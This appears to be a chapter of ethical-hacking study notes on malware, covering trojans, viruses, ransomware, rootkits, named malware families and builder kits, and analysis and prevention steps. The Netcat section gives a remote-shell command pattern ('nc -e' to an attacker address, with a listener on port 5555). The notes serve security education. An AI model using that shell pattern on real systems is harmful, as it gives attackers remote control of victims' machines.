# Malwares

> ⚡︎ **This chapter has [practical labs](https://github.com/Samsar4/Ethical-Hacking-Labs/tree/master/6-Malware)**

### <u>Malware Basics</u>
 
- **Malware** - software designed to harm or secretly access a computer system without informed consent
- Most is downloaded from the Internet with or without the user's knowledge
- **Overt Channels** - legitimate communication channels used by programs
- **Covert Channels** - used to transport data in unintended ways
- **Wrappers** - programs that allow you to bind an executable to an innocent file
- **Crypters** - use a combination of encryption and code manipulation to render malware undetectable to security programs
- **Packers** - use compression to pack the executable which helps evage signature based detection
- **Exploit Kits** - help deliver exploits and payloads
  - Infinity
  - Bleeding Life
  - Crimepack
  - Blackhole Exploit Kit

### <u>Trojans</u>

- **Trojans** - software that appears to perform a desirable function but instead performs malicious activity
  - To hackers, it is a method to gain and maintain access to a system
  - Trojans are means of delivery whereas a backdoor provides the open access
- **Types**
  - **Defacement trojan**
  - **Proxy server trojan**
  - **Botnet trojan**
    - Chewbacca
    - Skynet
  - **Remote access trojans**
    - RAT
    - MoSucker
    - Optix Pro
    - Blackhole
  - **E-banking trojans**
  	- Zeus
  	- Spyeye
  - **Command Shell Trojan** - Provides a backdoor to connect to through command-line access
    - Netcat
- **Covert Channel Tunneling Trojan** (CCTT) - a RAT trojan; creates data transfer channels in previously authorized data streams
- **Netcat**
  - "Swiss army knife" of tcp/ip hacking
  - Provides all sorts of control over a remote shell on a target
  - Connects via **nc -e IPaddress Port#**
  - From attack machine **nc -l -p 5555** opens a listening port on 5555
  - Can connect over TCP or UDP, from any port
  - Offers DNS forwarding, port mapping and forwarding and proxying
- **Trojan Port Numbers**

- **netstat -an** - shows open ports in numerical order
- **netstat -b** - displays all active connections and the processes using them
- **Process Explorer** - Microsoft tool that shows you everything about running processes
- **Registry Monitoring Tools**
  - SysAnalyzer
  - Tiny Watcher
  - Active Registry Monitor
  - Regshot
- **Msconfig** - Windows program that shows all programs set to start on startup
- **Tripwire** - integrity verifier that can act as a HIDS in protection against trojans
- **SIGVERIF** - build into Windows to verify the integrity of the system
  - Log  file can be found at c:\windows\system32\sigverif.txt
  - Look for drivers that are not signed

### <u>Viruses and Worms</u>

- **Virus** - self-replicating program that reproduces by attaching copies of itself into other executable code
  - Usually installed by user clicking on malicious file attachments or downloads
  - **Fake Antivirus** - tries to convince a user has a virus and have them download an AV that is a virus itself
- **Ransomware** - malicious software designed to deny access to a computer until a price is paid; usually spread through email
  - **WannaCry** - famous ransomware; within 24 hours had 230,000 victims; exploited unpatched SMB vulnerability
  - **Other Examples**
    - Cryptorbit
    - CryptoLocker
    - CryptoDefense
    - police-themed
- **Other Virus Types**
  - **Boot Sector Virus** - known as system virus; moves boot sector to another location and then inserts its code int he original location
  - **Shell Virus** - wraps  around an application's code, inserting itself before the application's
  - **Cluster Virus** - modifies directory table entries so every time a file or folder is opened, the virus runs
  - **Multipartite Virus** - attempts to infect both boot sector and files; generally refers to viruses with multiple infection methods
  - **Macro Virus** - written in VBA; infects template files - mostly Word and Excel
  - **Polymorphic Code Virus** - mutates its code by using a polymorphic engine; difficult to find because code is always changing
  - **Encryption Virus** - uses  encryption to hide the code from antivirus
  - **Metamorphic Virus** - rewrites itself every time it infects a new file
  - **Stealth Virus** - known as a tunneling virus; attempts to evade AVs by intercepting their requests and returning them instead of letting them pass to the OS
  - **Cavity Virus** - overwrite portions of host files as to not increase the actual size of the file; uses null content sections
  - **Sparse Infector Virus** - only infects occasionally (e.g. every 10th time)
  - **File Extension Virus** - changes the file extensions of files to take advantage of most people having them turned off (readme.txt.vbs shows as readme.txt)
- **Virus Makers**
  - Sonic Bat
  - PoisonVirus Maker
  - Sam's Virus Generator
  - JPS Virus Maker
- **Worm** - self-replicating malware that sends itself to other computers without human intervention
  - Usually doesn't infect files - just resides in active memory
  - Often used in botnets
- **Ghost Eye Worm** - hacking tool that uses random messaging on Facebook and other sites to perform a host of malicious efforts

### <u>Analyzing Malware</u>

- **Steps**
  1. Make sure you have a good test bed
     - Use a VM with NIC in host-only mode and no open shares
  2. Analyze the malware on the isolated VM in a static state
     - Tools - binText and UPX help with looking at binary
  3. Run the malware and check out processes
     - Use Process Monitor, etc. to look at processes
     - Use NetResident, TCPview or even Wireshark to look at network activity
  4. Check and see what files were added, changed, or deleted
     - Tools - IDA Pro, VirusTotal, Anubis, Threat Analyzer
- **Preventing Malware**
  - Make sure you know what is going on in your system
  - Have a good antivirus that is up to date
  - **Sheepdip** - system that is used to check things introduced into a network
    - Airgapped - isolated on network
- **Tools for Disassembling | Debugging | Reverse Engineering:**
  - IDA Pro
  - OllyDdg 
  - Ghidra by NSA

## <u>Rootkits</u>

- Software put in place by attacker to obscure system compromise
- Hides processes and files
- Also allows for future access
- **Examples**
  - Horsepill - Linus kernel rootkit inside initrd
  - Grayfish - Windows rootkit that injects in boot record
  - Firefef - multi-component family of malware
  - Azazel
  - Avatar
  - Necurs
  - ZeroAccess
- **Hypervisor level** - rootkits that modify the boot sequence of a host system to load a VM as the host OS
- **Hardware** - hide malware in devices or firmware
- **Boot loader level** - replace boot loader with one controlled by hacker
- **Application level** - directed to replace valid application files with Trojans
- **Kernel level** - attack boot sectors and kernel level replacing kernel code with back-door code; most dangerous
- **Library level** - use system-level calls to hide themselves
- One way to detect rootkits is to map all the files on a system and then boot a system from a clean CD version and compare the two file systems
